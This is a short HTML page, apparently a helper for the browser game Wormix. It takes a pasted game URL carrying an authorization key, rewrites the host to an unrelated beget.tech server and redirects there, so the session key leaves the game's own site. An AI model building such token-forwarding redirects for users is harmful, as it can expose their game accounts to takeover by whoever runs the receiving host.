<!DOCTYPE html>
<html>
<head>
    <title>Wormix Generator Link</title>
    <style>
        body {
            background-color: #2651B5;
        }

        input[type="text"] {
            width: 300px;
            padding: 10px;
            font-size: 16px;
        }
        
        input[type="submit"] {
            padding: 10px 20px;
            font-size: 16px;
        }
    </style>
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.cdnfonts.com/css/google-sans" rel="stylesheet">
</head>
<body>
    <h1>Ключ авторизации (без https)</h1>
    <form id="urlForm">
        <input type="text" id="urlInput" placeholder="http://markus..">
        <input type="submit" value="Отправить">
    </form>
    
    <script>
        document.getElementById('urlForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Предотвращаем отправку формы
            
            var originalUrl = document.getElementById('urlInput').value;
            var modifiedUrl = originalUrl.replace('markus.rmart.ru/engine/preloader/', 'h99942fc.beget.tech/');
            
            window.location.href = modifiedUrl; // Перенаправляем на измененный URL
        });
    </script>
</body>
</html>
